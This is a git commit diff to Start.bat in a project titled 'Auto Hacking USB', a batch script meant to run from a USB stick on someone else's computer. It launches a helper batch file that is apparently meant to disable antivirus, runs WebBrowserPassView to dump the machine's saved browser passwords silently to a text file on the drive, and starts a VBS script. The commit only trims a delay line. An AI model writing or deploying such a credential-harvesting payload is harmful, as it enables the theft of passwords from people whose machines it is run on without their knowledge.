8fb9d7c0237b88b99d91deff29138ab3b8115505
xyse <xyseprg@gmail.com>
2015-06-17 21:25:21 +0200

    So little faster again

--- Start.bat
+++ Start.bat
@@ -1,10 +1,8 @@
 @echo off
 title Auto Hacking USB - xyse
 :Start
-md Files
 start .\App\avrem.bat
 ping localhost -n 2 >nul
-ping 1.1.1.1 -n 1 -w 400 > nul
 start .\App\WebPass\WebBrowserPassView.exe /stext .\Files\Passwords.txt
 start input.vbs
 exit
